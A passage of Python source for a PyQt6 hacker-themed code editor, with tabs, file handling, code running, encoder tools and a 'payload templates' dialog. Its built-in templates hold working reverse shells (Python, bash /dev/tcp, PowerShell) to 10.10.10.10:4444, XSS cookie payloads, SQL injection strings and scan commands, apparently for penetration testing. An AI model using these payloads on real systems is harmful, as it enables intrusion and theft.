        toolbar.addWidget(self.lang_combo)

        editor_layout.addWidget(toolbar)

        # === TAB WIDGET ===
        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_tab)
        self.tabs.setDocumentMode(True)
        editor_layout.addWidget(self.tabs)

        # Create the first tab automatically
        self.create_new_tab(initial_text=True)

        # Status Bar
        self.status_bar = QStatusBar()
        self.status_bar.setStyleSheet("""
            QStatusBar {
                background: #330000;
                color: #ff0066;
                font-weight: bold;
                border-top: 2px solid #ff0066;
            }
        """)
        self.status_bar.showMessage("STATUS: ACTIVE // LEVIATHAN EDIT v3.0 // THEME: FBI Terminal")
        # === OUTPUT CONSOLE ===
        self.output_console = QPlainTextEdit()
        self.output_console.setReadOnly(True)
        self.output_console.setFixedHeight(200)
        self.output_console.setStyleSheet("""
            QPlainTextEdit {
                background: transparent;
                color: #ff4444;
                border-top: 2px solid #ff4444;
                font-family: Consolas;
                font-size: 12pt;
            }
        """)
        self.output_console.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        self.output_console.viewport().setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, True)
        editor_layout.addWidget(self.output_console)
        editor_layout.addWidget(self.status_bar)

        # Add editor area
        main_layout.addWidget(editor_area, 1)

    ###############################################################
    #          TAB SYSTEM METHODS (FULLY SELF-CONTAINED)          #
    ###############################################################

    def create_new_tab(self, initial_text=False):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(0, 0, 0, 0)

        # Use CodeEditorWithLineNumbers instead of QTextEdit
        editor = CodeEditorWithLineNumbers()

        # === AUTOCOMPLETE EVENT FILTER (REQUIRED BY JEDI) ===
        editor.installEventFilter(self)
    
        editor.setFont(QFont("Consolas", self.current_font_size))
        editor.setStyleSheet("""
            QPlainTextEdit {
                background: transparent;
                color: #00ff41;
                selection-background-color: #003300;
                border: none;
                font-family: Consolas;
            }
        """)

        # Syntax highlighter for this tab
        highlighter = SyntaxHighlighter(editor.document())

        layout.addWidget(editor)

        index = self.tabs.addTab(tab, "Untitled")
        self.tabs.setCurrentIndex(index)
        tab.editor = editor
        tab.highlighter = highlighter  # Store reference to prevent garbage collection

        if initial_text:
            editor.setPlainText("# Leviathan Editor Loaded\n")

    def current_editor(self):
        tab = self.tabs.currentWidget()
        if hasattr(tab, 'editor'):
            return tab.editor
        return None

    def close_tab(self, index):
        if self.tabs.count() == 1:
            QMessageBox.warning(self, "ERROR", "You cannot close the final tab.")
        else:
            self.tabs.removeTab(index)

    ###############################################################
    #               FILE OPERATIONS MODIFIED FOR TABS             #
    ###############################################################

    def new_file(self):
        self.create_new_tab()

    def open_file(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Open File", 
            "", "All Files (*.*);;Python (*.py);;JavaScript (*.js);;HTML (*.html);;CSS (*.css);;Bash (*.sh)"
        )
        if not path:
            return

        try:
            with open(path, 'r', encoding='utf-8') as f:
                data = f.read()

            self.create_new_tab()
            ed = self.current_editor()
            if ed:
                ed.setPlainText(data)

            self.tabs.setTabText(self.tabs.currentIndex(), os.path.basename(path))
            self.status_bar.showMessage(f"Loaded {path}")
            
            # Auto-detect language
            ext = os.path.splitext(path)[1].lower()
            lang_map = {
                '.py': 'Python', '.js': 'JavaScript', '.html': 'HTML', '.css': 'CSS',
                '.sh': 'Bash', '.c': 'C', '.cpp': 'C++', '.h': 'C', '.java': 'Java',
                '.go': 'Go', '.rs': 'Rust', '.php': 'PHP', '.rb': 'Ruby', '.sql': 'SQL'
            }
            
            if ext in lang_map:
                self.lang_combo.setCurrentText(lang_map[ext])
                self.change_language(lang_map[ext])
            
        except Exception as e:
            QMessageBox.critical(self, "ERROR", f"Failed to open file:\n{str(e)}")

    def save_file(self):
        ed = self.current_editor()
        if not ed:
            return
            
        path, _ = QFileDialog.getSaveFileName(
            self, "Save File", 
            "", "All Files (*.*);;Python (*.py);;Text (*.txt)"
        )
        if not path:
            return

        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(ed.toPlainText())

            self.tabs.setTabText(self.tabs.currentIndex(), os.path.basename(path))
            QMessageBox.information(self, "FILE SAVED", "File encrypted and saved.")
            self.status_bar.showMessage(f"SAVED: {os.path.basename(path)}")
            
        except Exception as e:
            QMessageBox.critical(self, "ERROR", f"Failed to save file:\n{str(e)}")

    # ================ BACKGROUND IMAGE METHODS - UNTOUCHED ================
    def set_background_image(self):
        """Set background image"""
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Background Image",
            "", "Images (*.png *.jpg *.jpeg *.bmp *.gif *.webp)"
        )
    
        if path:
            self.background_image_path = path
        
            # Clear any old stylesheet backgrounds
            self.setStyleSheet("")
        
            # Apply using new method
            self.apply_background_style()
        
            QMessageBox.information(self, "BACKGROUND ACTIVATED", 
                              f"Background image loaded.\nMode: {self.background_mode.upper()}")
            self.status_bar.showMessage(f"BACKGROUND: {os.path.basename(path)} // MODE: {self.background_mode.upper()}")

    def clear_background_image(self):
        """Clear background image and revert to theme"""
        self.background_image_path = None
        self.background_mode = "cover"  # ADD THIS LINE - Reset to default
    
        # Clear all stylesheets first
        self.setStyleSheet("")
        self.centralWidget().setStyleSheet("")
    
        # Re-apply theme
        self.apply_theme()
    
        self.status_bar.showMessage("BACKGROUND CLEARED // THEME: " + self.current_theme)

    def load_theme(self, theme_name):
        """Load a theme"""
        self.current_theme = theme_name
        self.custom_colors = self.themes[theme_name].copy()
        self.apply_theme()

    def apply_theme(self):
        """Apply current theme - UPDATED TO PRESERVE BACKGROUND"""
        # If background image is active, only update text colors
        c = self.custom_colors
        
        if self.background_image_path:
            # Background image is active - only update text colors
            for i in range(self.tabs.count()):
                tab = self.tabs.widget(i)
                if hasattr(tab, 'editor'):
                    tab.editor.setStyleSheet(f"""
                        QPlainTextEdit {{
                            background: transparent;
                            color: {c['text']};
                            selection-background-color: {c['select']};
                            border: none;
                        }}
                    """)
        else:
            # No background image - apply full theme
            self.setStyleSheet(f"""
                QMainWindow {{
                    background-color: {c['bg']};
                }}
                
                QWidget#centralwidget {{
                    background: {c['bg']};
                }}
            """)
            
            # Also apply to all tabs
            for i in range(self.tabs.count()):
                tab = self.tabs.widget(i)
                if hasattr(tab, 'editor'):
                    tab.editor.setStyleSheet(f"""
                        QPlainTextEdit {{
                            background: transparent;
                            color: {c['text']};
                            selection-background-color: {c['select']};
                            border: none;
                        }}
                    """)
        
        # Update status bar
        if self.background_image_path:
            self.status_bar.showMessage(f"BACKGROUND: {os.path.basename(self.background_image_path)} // THEME TEXT: {self.current_theme}")
        else:
            self.status_bar.showMessage(f"THEME: {self.current_theme} // LANG: {self.current_language}")

    def change_language(self, lang):
        """Change programming language"""
        self.current_language = lang
        self.lexer = get_lexer_by_name(lang.lower())
        if self.background_image_path:
            self.status_bar.showMessage(f"LANG: {lang} // BACKGROUND: {os.path.basename(self.background_image_path)}")
        else:
            self.status_bar.showMessage(f"LANG: {lang} // THEME: {self.current_theme}")

    def increase_font(self):
        """Increase font size"""
        self.current_font_size = min(self.current_font_size + 2, 32)
        
        # Apply to all tabs
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setFont(QFont("Consolas", self.current_font_size))
        
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt")

    def decrease_font(self):
        """Decrease font size"""
        self.current_font_size = max(self.current_font_size - 2, 8)
        
        # Apply to all tabs
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setFont(QFont("Consolas", self.current_font_size))
        
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt")

    def change_transparency(self, value):
        """Change window transparency"""
        self.current_transparency = value / 100.0
        self.setWindowOpacity(self.current_transparency)
        self.status_bar.showMessage(f"TRANSPARENCY: {value}%")

    # === TOOL FUNCTIONS ===
    def open_base64_tool(self):
        """Open Base64 encoder/decoder tool"""
        dialog = Base64ToolDialog(self)
        dialog.exec()

    def open_url_tool(self):
        """Open URL encoder/decoder tool"""
        dialog = URLToolDialog(self)
        dialog.exec()

    def open_hash_tool(self):
        """Open hash identifier tool"""
        dialog = HashToolDialog(self)
        dialog.exec()

    def open_templates_tool(self):
        """Open payload templates tool"""
        dialog = TemplatesDialog(self, self.custom_templates)
        dialog.exec()
        
    # ============================================
    #  LANGUAGE → RUN COMMAND MAP
    # ============================================
    def get_run_command(self, filepath):
        """
        Build a shell command to run the given filepath, using a discovered python
        interpreter when needed. Returns None if a required interpreter is not found.
        """
        lang = self.current_language.lower()

        # Ensure we have a usable python interpreter when needed
        python_path = self.find_python()

        commands = {
            "python": f'"{python_path}" "{filepath}"' if python_path else None,
            "javascript": f'node "{filepath}"',
            "bash": f'bash "{filepath}"',
            "c": f'gcc "{filepath}" -o "{filepath}.out" && "{filepath}.out"',
            "c++": f'g++ "{filepath}" -o "{filepath}.out" && "{filepath}.out"',
            "go": f'go run "{filepath}"',
            "rust": f'rustc "{filepath}" -o "{filepath}.out" && "{filepath}.out"',
            "php": f'php "{filepath}"',
            "ruby": f'ruby "{filepath}"',
            "java": f'javac "{filepath}" && java {os.path.splitext(os.path.basename(filepath))[0]}'
        }

        # Default to python if language unknown — but ensure python is available
        default = f'"{python_path}" "{filepath}"' if python_path else None

        return commands.get(lang, default)

    # ============================================
    #  RUN CURRENT FILE + ERROR PARSING
    # ============================================
    def run_current_file(self):
        editor = self.current_editor()
        if not editor:
            return

        # Prevent crashes when running empty file
        code = editor.toPlainText()
        if code.strip() == "":
            QMessageBox.warning(self, "EMPTY FILE", "There is no code to run.")
            return

        import tempfile
        import subprocess
        import shutil
        import traceback

        # --- choose temp file in system temp dir with correct extension ---
        ext_map = {
            "Python": ".py",
            "JavaScript": ".js",
            "Bash": ".sh",
            "C": ".c",
            "C++": ".cpp",
            "Java": ".java",
            "Go": ".go",
            "Rust": ".rs",
            "PHP": ".php",
            "Ruby": ".rb",
            "SQL": ".sql"
        }

        ext = ext_map.get(self.current_language, ".txt")
        # create a safe temporary file (will not be deleted automatically)
        try:
            tf = tempfile.NamedTemporaryFile(mode="w", suffix=ext, prefix="leviathan_run_", delete=False, encoding="utf-8")
            temp_path = tf.name
            tf.write(code)
            tf.flush()
            tf.close()
        except Exception as e:
            QMessageBox.critical(self, "TEMP FILE ERROR", f"Failed to create temporary file:\n{e}")
            return

        # Build run command (may be None if python not found)
        command = self.get_run_command(temp_path)
        if command is None:
            # If it's a Python run and no interpreter found, inform user
            QMessageBox.critical(
                self,
                "Interpreter Not Found",
                "Could not find a system Python interpreter (python/python3/py). "
                "Please install Python and ensure it is available on PATH."
            )
            # Clean up temp file
            try:
                os.remove(temp_path)
            except:
                pass
            return

        # Run the code and capture output. Use a try/except/finally and clean up temp file after.
        stdout = ""
        stderr = ""
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                text=True
            )
            stdout, stderr = process.communicate()
        except Exception as e:
            # Show full traceback in console for debugging
            tb = traceback.format_exc()
            self.output_console.setPlainText(f"RUN ERROR:\n{str(e)}\n\nTraceback:\n{tb}")
            try:
                os.remove(temp_path)
            except:
                pass
            return
        finally:
            # Always try to remove the temporary file
            try:
                os.remove(temp_path)
            except:
                pass

        # Output to console
        self.output_console.clear()
        if stdout:
            self.output_console.appendPlainText(stdout)
        if stderr:
            self.output_console.appendPlainText(stderr)

        # Try to find line errors
        self.highlight_error_line(stderr)


    def highlight_error_line(self, error_text):
        if not error_text:
            return

        editor = self.current_editor()
        if not editor:
            return

        # Common error formats like:
        #   File "x.py", line 23
        match = re.search(r'line (\d+)', error_text)
        if not match:
            return

        line_num = int(match.group(1)) - 1  # zero-based

        cursor = editor.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.Start)
        cursor.movePosition(QTextCursor.MoveOperation.Down, n=line_num)
        editor.setTextCursor(cursor)

        # Flash highlight (temporary)
        extra = QTextEdit.ExtraSelection()
        extra.format.setBackground(QColor("#440000"))
        extra.cursor = cursor
        editor.setExtraSelections([extra])
        
    def show_autocomplete(self):
        editor = self.current_editor()
        if not editor:
            return

        # Get text and cursor position
        text = editor.toPlainText()
        cursor = editor.textCursor()
        line = cursor.blockNumber() + 1
        column = cursor.columnNumber()

        try:
            script = jedi.Script(code=text)
            completions = script.complete(line, column)
        except Exception:
            self.autocomplete_popup.hide()
            return

        if not completions:
            self.autocomplete_popup.hide()
            return

        # Fill popup
        self.autocomplete_popup.clear()
        for c in completions:
            item = QListWidgetItem(c.name)
            self.autocomplete_popup.addItem(item)

        # Position popup below cursor
        cursor_rect = editor.cursorRect()
        pos = editor.mapToGlobal(cursor_rect.bottomRight())

        self.autocomplete_popup.move(pos + QPoint(10, 10))
        self.autocomplete_popup.setCurrentRow(0)
        self.autocomplete_popup.show()
        
    def apply_completion(self):
        editor = self.current_editor()
        if not editor:
            return

        item = self.autocomplete_popup.currentItem()
        if not item:
            self.autocomplete_popup.hide()
            return

        text = item.text()

        cursor = editor.textCursor()

        # Delete the partial word before inserting
        cursor.select(cursor.SelectionType.WordUnderCursor)
        cursor.removeSelectedText()

        cursor.insertText(text)
        editor.setTextCursor(cursor)

        self.autocomplete_popup.hide()
        
    # ===========================================
    # EVENT FILTER FOR AUTOCOMPLETE
    # ===========================================
    def eventFilter(self, obj, event):
        # Key presses inside editor
        if event.type() == event.Type.KeyPress:
            key = event.key()

            # Hide popup on Escape
            if key == Qt.Key.Key_Escape:
                self.autocomplete_popup.hide()
                return False

            # Accept completion with Enter/Return/Tab
            if self.autocomplete_popup.isVisible():
                if key in (Qt.Key.Key_Return, Qt.Key.Key_Enter, Qt.Key.Key_Tab):
                    self.apply_completion()
                    return True

                # Move in list
                if key == Qt.Key.Key_Up:
                    current = self.autocomplete_popup.currentRow()
                    self.autocomplete_popup.setCurrentRow(max(0, current - 1))
                    return True

                if key == Qt.Key.Key_Down:
                    current = self.autocomplete_popup.currentRow()
                    self.autocomplete_popup.setCurrentRow(
                        min(self.autocomplete_popup.count() - 1, current + 1)
                    )
                    return True

            # Trigger suggestions on:
            # letters, numbers, underscore, dot
            if key == Qt.Key.Key_Period or key == Qt.Key.Key_Underscore:
                QTimer.singleShot(0, self.show_autocomplete)
            elif 32 <= key < 127:  # Printable ASCII range
                try:
                    if chr(key).isalnum():
                        QTimer.singleShot(0, self.show_autocomplete)
                except ValueError:
                    pass
            else:
                # Hide popup when typing unrelated keys
                self.autocomplete_popup.hide()

        return super().eventFilter(obj, event)

    def change_background_mode(self, mode):
        """Change background image display mode"""
        self.background_mode = mode.lower()
    
        print(f"DEBUG: Mode changed to {self.background_mode}")  # ADD THIS DEBUG LINE
    
        # Re-apply background if one is set
        if self.background_image_path:
            print(f"DEBUG: Applying background style...")  # ADD THIS DEBUG LINE
            self.apply_background_style()
        else:
            print(f"DEBUG: No background image set")  # ADD THIS DEBUG LINE

    def apply_background_style(self):
        """Apply background image with current mode using QPalette"""
        if not self.background_image_path:
            return
    
        print(f"DEBUG: Applying mode '{self.background_mode}' to image")
    
        # Load the original image
        from PyQt6.QtGui import QBrush  # Make sure this is imported at top of file
    
        pixmap = QPixmap(self.background_image_path)
        if pixmap.isNull():
            print("DEBUG: Failed to load image")
            return
    
        # Get the window size
        window_size = self.size()
    
        # Scale the pixmap based on mode
        if self.background_mode == "cover":
            # Scale to cover entire window, crop if needed
            scaled = pixmap.scaled(
                window_size, 
                Qt.AspectRatioMode.KeepAspectRatioByExpanding,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "contain":
            # Scale to fit inside window, may have borders
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "stretch":
            # Stretch to fill window (ignores aspect ratio)
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.IgnoreAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "center":
            # Use original size, centered
            scaled = pixmap
        elif self.background_mode == "tile":
            # For tile, we'll use original size and tile it
            scaled = pixmap
        else:
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.KeepAspectRatioByExpanding,
                Qt.TransformationMode.SmoothTransformation
            )
    
        # Create a brush from the pixmap - THIS IS THE FIX
        brush = QBrush(scaled)
    
        # Apply the background using QPalette
        palette = self.palette()
        palette.setBrush(QPalette.ColorRole.Window, brush)  # Use brush, not pixmap
        self.setPalette(palette)
    
        # Set autoFillBackground to True so palette is used
        self.setAutoFillBackground(True)
    
        # Make sure widgets stay transparent
        self.centralWidget().setStyleSheet("background: transparent;")
    
        # Apply to all tab editors
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setStyleSheet("background: transparent; color: #00ff41;")
    
        print(f"DEBUG: Background applied with mode '{self.background_mode}'!")
        self.status_bar.showMessage(f"BACKGROUND MODE: {self.background_mode.upper()}")
        
# ================= TOOL DIALOGS =================

class Base64ToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("BASE64 ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
                min-width: 150px;
                min-height: 40px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 2px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 14))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.setFixedHeight(45)
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.setFixedHeight(45)
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = base64.b64encode(text.encode()).decode()
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        try:
            decoded = base64.b64decode(text.encode()).decode()
            self.output_text.setPlainText(decoded)
        except:
            self.output_text.setPlainText("ERROR: Invalid Base64")

class URLToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("URL ENCODER/DECODER")
        self.setFixedSize(600, 500)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #330000, stop:1 #110000);
                color: #ff4444;
                border: 2px solid #ff4444;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
                font-size: 14px;
                min-width: 150px;
                min-height: 40px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #550000, stop:1 #330000);
                border: 2px solid #ff8888;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("INPUT:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.input_text = QTextEdit()
        self.input_text.setMaximumHeight(100)
        layout.addWidget(self.input_text)
        
        # Output
        output_label = QLabel("OUTPUT:")
        output_label.setFont(QFont("Consolas", 14))
        layout.addWidget(output_label)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(100)
        layout.addWidget(self.output_text)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        encode_btn = QPushButton("ENCODE")
        encode_btn.setFixedHeight(45)
        encode_btn.clicked.connect(self.encode)
        button_layout.addWidget(encode_btn)
        
        decode_btn = QPushButton("DECODE")
        decode_btn.setFixedHeight(45)
        decode_btn.clicked.connect(self.decode)
        button_layout.addWidget(decode_btn)
        
        layout.addLayout(button_layout)
        layout.addStretch()
        
        self.setLayout(layout)
    
    def encode(self):
        text = self.input_text.toPlainText()
        encoded = urllib.parse.quote(text)
        self.output_text.setPlainText(encoded)
    
    def decode(self):
        text = self.input_text.toPlainText()
        decoded = urllib.parse.unquote(text)
        self.output_text.setPlainText(decoded)

class HashToolDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("HASH IDENTIFIER")
        self.setFixedSize(600, 400)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #00ffaa;
                font-weight: bold;
                font-size: 14px;
            }
            QLineEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                padding: 12px;
                font-family: Consolas;
                font-size: 13pt;
                min-height: 40px;
            }
            QTextEdit {
                background: #001122;
                color: #00ffaa;
                border: 1px solid #00ff41;
                font-family: Consolas;
                font-size: 12pt;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 2px solid #00ff41;
                padding: 12px;
                font-weight: bold;
                border-radius: 6px;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Input
        input_label = QLabel("ENTER HASH:")
        input_label.setFont(QFont("Consolas", 14))
        layout.addWidget(input_label)
        
        self.hash_input = QLineEdit()
        layout.addWidget(self.hash_input)
        
        # Result
        result_label = QLabel("POSSIBLE HASH TYPES:")
        result_label.setFont(QFont("Consolas", 14))
        layout.addWidget(result_label)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        
        # Button
        identify_btn = QPushButton("IDENTIFY HASH")
        identify_btn.clicked.connect(self.identify)
        layout.addWidget(identify_btn)
        
        self.setLayout(layout)
    
    def identify(self):
        hash_val = self.hash_input.text().strip()
        self.result_text.clear()
        
        if not hash_val:
            self.result_text.setPlainText("ERROR: No hash provided")
            return
        
        length = len(hash_val)
        results = []
        hex_pattern = r'^[a-fA-F0-9]+$'
        
        if length == 32 and re.match(hex_pattern, hash_val):
            results.append("MD5 (Message Digest 5)")
            results.append("NTLM (Windows)")
        
        if length == 40 and re.match(hex_pattern, hash_val):
            results.append("SHA-1 (Secure Hash Algorithm 1)")
        
        if length == 56 and re.match(hex_pattern, hash_val):
            results.append("SHA-224")
        
        if length == 64 and re.match(hex_pattern, hash_val):
            results.append("SHA-256")
            results.append("SHA3-256")
            results.append("Keccak-256")
        
        if length == 96 and re.match(hex_pattern, hash_val):
            results.append("SHA-384")
        
        if length == 128 and re.match(hex_pattern, hash_val):
            results.append("SHA-512")
            results.append("SHA3-512")
        
        if hash_val.startswith('$1'):
            results.append("MD5 Crypt")
        
        if hash_val.startswith('$2a') or hash_val.startswith('$2b') or hash_val.startswith('$2y'):
            results.append("bcrypt")
        
        if hash_val.startswith('$5'):
            results.append("SHA-256 Crypt")
        
        if hash_val.startswith('$6'):
            results.append("SHA-512 Crypt")
        
        if hash_val.startswith('$apr1'):
            results.append("APR1 (Apache)")
        
        if not results:
            results.append("UNKNOWN - Could not identify hash type")
            results.append(f"Length: {length} characters")
        
        output = "IDENTIFIED HASH TYPES:\n" + "="*60 + "\n"
        for i, r in enumerate(results, 1):
            output += f"{i}. {r}\n"
        
        self.result_text.setPlainText(output)

class TemplatesDialog(QDialog):
    def __init__(self, parent=None, custom_templates=None):
        super().__init__(parent)
        self.parent_editor = parent
        self.custom_templates = custom_templates or {}
        self.setWindowTitle("PAYLOAD TEMPLATES")
        self.resize(800, 600)
        self.setStyleSheet("""
            QDialog {
                background: #000011;
            }
            QLabel {
                color: #ff0066;
                font-weight: bold;
                font-size: 14px;
            }
            QScrollArea {
                border: none;
                background: transparent;
            }
            QFrame {
                background: #001122;
                border: 2px solid #00ff41;
                border-radius: 8px;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #003300, stop:1 #001100);
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 10px;
                font-weight: bold;
                border-radius: 4px;
                font-size: 12px;
                min-width: 200px;
                min-height: 35px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #005500, stop:1 #003300);
                border: 1px solid #00ff88;
            }
        """)
        
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("CLASSIFIED PAYLOAD DATABASE")
        title.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # Scroll area
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        
        container = QWidget()
        container_layout = QVBoxLayout(container)
        
        # Built-in templates
        builtin_label = QLabel("BUILT-IN TEMPLATES")
        builtin_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
        builtin_label.setStyleSheet("color: #00ffaa;")
        container_layout.addWidget(builtin_label)
        
        templates = self.get_builtin_templates()
        for name, code in templates.items():
            frame = QFrame()
            frame_layout = QVBoxLayout(frame)
            
            name_label = QLabel(name)
            name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            name_label.setStyleSheet("color: #00ffaa;")
            frame_layout.addWidget(name_label)
            
            insert_btn = QPushButton("INSERT INTO EDITOR")
            insert_btn.setFixedHeight(35)
            insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
            frame_layout.addWidget(insert_btn)
            
            container_layout.addWidget(frame)
        
        # Custom templates
        if self.custom_templates:
            custom_label = QLabel("CUSTOM TEMPLATES")
            custom_label.setFont(QFont("Consolas", 14, QFont.Weight.Bold))
            custom_label.setStyleSheet("color: #ff6600;")
            container_layout.addWidget(custom_label)
            
            for name, code in self.custom_templates.items():
                frame = QFrame()
                frame.setStyleSheet("background: #112200; border: 2px solid #ffaa00;")
                frame_layout = QVBoxLayout(frame)
                
                name_label = QLabel(name)
                name_label.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
                name_label.setStyleSheet("color: #ffaa00;")
                frame_layout.addWidget(name_label)
                
                insert_btn = QPushButton("INSERT INTO EDITOR")
                insert_btn.setFixedHeight(35)
                insert_btn.clicked.connect(lambda checked, c=code: self.insert_template(c))
                frame_layout.addWidget(insert_btn)
                
                container_layout.addWidget(frame)
        
        container_layout.addStretch()
        scroll.setWidget(container)
        layout.addWidget(scroll)
        
        self.setLayout(layout)
    
    def get_builtin_templates(self):
        """Return built-in templates"""
        return {
            "PYTHON REVERSE SHELL": '''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            
            "BASH REVERSE SHELL": '''bash -i >& /dev/tcp/10.10.10.10/4444 0>&1''',
            
            "POWERSHELL REVERSE SHELL": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"''',
            
            "NETCAT LISTENER": '''nc -lvnp 4444''',
            
            "XSS BASIC": '''<script>alert(document.cookie)</script>''',
            
            "XSS IMG TAG": '''<img src=x onerror=alert(document.cookie)>''',
            
            "XSS ADVANCED": '''<svg/onload=alert(String.fromCharCode(88,83,83))>''',
            
            "SQL INJECTION UNION": """' UNION SELECT NULL,NULL,NULL--""",
            
            "SQL INJECTION AUTH BYPASS": """' OR '1'='1' --""",
            
            "SQL INJECTION TIME BASED": """' OR IF(1=1, SLEEP(5), 0)--""",
            
            "NMAP AGGRESSIVE SCAN": '''nmap -A -T4 -p- 10.10.10.10''',
            
            "NMAP VULN SCAN": '''nmap -sV --script vuln 10.10.10.10''',
            
            "NMAP SERVICE SCAN": '''nmap -sV -sC -p- 10.10.10.10 -oN scan.txt''',
            
            "METASPLOIT HANDLER": '''use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit''',
            
            "GOBUSTER DIR SCAN": '''gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt''',
            
            "FFUF WEB FUZZING": '''ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt''',
            
